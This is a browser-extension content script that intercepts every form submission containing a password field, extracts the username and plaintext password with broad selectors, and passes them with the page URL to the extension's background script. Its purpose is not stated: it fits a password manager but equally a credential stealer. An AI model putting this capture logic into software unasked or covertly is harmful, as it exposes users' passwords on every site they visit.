// Detect form submissions and extract credentials
function isLoginOrSignup(form) {
  // Heuristic: look for password input
  return form.querySelector('input[type="password"]');
}

document.addEventListener('submit', function(event) {
  const form = event.target;
  if (!isLoginOrSignup(form)) return;

  const passwordInput = form.querySelector('input[type="password"]');
  if (!passwordInput) return;

  // Try to find username/email input with more comprehensive selectors
  const usernameInput = form.querySelector(
    'input[type="email"], ' +
    'input[type="text"][name*="user" i], ' +
    'input[type="text"][name*="email" i], ' +
    'input[type="text"][id*="user" i], ' +
    'input[type="text"][id*="email" i], ' +
    'input[type="text"][id*="login" i], ' +
    'input[type="text"][id*="account" i], ' +
    'input[type="text"][id*="name" i], ' +
    'input[type="text"][placeholder*="user" i], ' +
    'input[type="text"][placeholder*="email" i], ' +
    'input[type="text"][placeholder*="login" i], ' +
    'input[type="text"][placeholder*="account" i], ' +
    'input[type="text"][placeholder*="name" i]'
  );
  const username = usernameInput ? usernameInput.value : '';
  const password = passwordInput.value;
  const url = window.location.href;
  const timestamp = new Date().toISOString();

  // Send to background
  chrome.runtime.sendMessage({
    type: 'SAVE_CREDENTIAL',
    data: { username, password, url, timestamp }
  });
}); 